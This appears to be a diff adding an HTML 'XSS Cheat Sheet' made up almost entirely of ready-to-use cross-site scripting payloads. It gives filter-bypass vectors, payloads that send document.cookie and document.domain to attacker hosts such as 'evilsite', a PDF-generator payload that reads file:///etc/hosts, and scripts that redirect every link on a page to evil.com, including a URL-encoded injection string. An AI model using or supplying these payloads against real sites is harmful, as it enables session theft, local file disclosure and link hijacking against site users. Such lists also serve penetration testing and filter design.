@@ -1,0 +1,62 @@
+<html>
+	<head>
+		<title>XSS Cheat Sheet</title>
+	</head>
+	
+	<body>
+		<h1>[General XSS]
+<code> "/><img src=x onerror=alert('XSS Hurray')>
+<script src=data:&comma;alert('SRC XSS')>
+<svg/onload=alert('SVG XSS')>
+<iframe src="" srcdoc="<script>alert('IFRAME XSS')</script>"></iframe>
+<iframe src="javascript:alert(JAVASCRIPT:')"></iframe>
+<svg </onload ="1> (_=prompt,_('SVG ONLOAD'))"">
+"autofocus/onfocus="thr=new XMLHttpRequest();thr.open('GET','//[yourhost]/[yourhook].php?t=&d='+document.domain,true);thr.send(null);"//
+			x@x.com<--`<img/src=` onerror=alert("Friendly-XSS")> --!> </code></h1>
+
+	<h2> [Special Edition]
+		
+<code>
+<noscript><p title="</noscript><svg/onload=alert('NOSCRIPT')>">
+<xmp><p title="</xmp><svg/onload=alert('XMP')>">
+<noframes><p title="</noframes><svg/onload=alert('NOFRAMES')>">
+<iframe><p title="</iframe><svg/onload=alert('/IFRAMES')>">
+	1'"><img/src/onerror=.1|alert``></code></h2>
+	
+<h3>
+[Cookie Stealing]
+<code>
+<img src=x onerror=this.src='http://evilsite/?c='+document.cookie>
+
+	<strong>[With this, it will never end the loading of the page]</strong>
+ 
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open('GET','https://evilsite/xmlreq?c='+document.cookie,true);
+xmlHttp.send(null);
+	</code><h3>
+
+	<h4>[For PDF Generator, is important to wait for response]
+
+<code><script>var xmlHttp = new XMLHttpRequest();
+xmlHttp.onload=function(){  document.write('<p><font size="2">'+this.responseText+"</font></p>")};
+xmlHttp.open("GET","file:///etc/hosts");
+xmlHttp.send();
+</script>
+
+	use this as a JS source :)!</code></h4>
+
+	<h6>[Change every link on the page]
+
+<code>Array.from(document.getElementsByTagName("a")).forEach(function(i) {
+  i.href = "https://evil.com";
+});
+		</code></h6>
+	<h5>[You can chain with the img tag and put the entire function on the JS]
+<code>
+https://vuln.com/?xssparameter=%3Cimg%20src=x%20onerror=Array.from(document.getElementsByTagName(%22a%22)).forEach(function(i){i.href%3d%22https%3a//evil.com%22%3b})%3b%3E
+		</code></h5>
+
+<h1>[JavaScript Handler]
+
+	</h1></body>
+	</html>
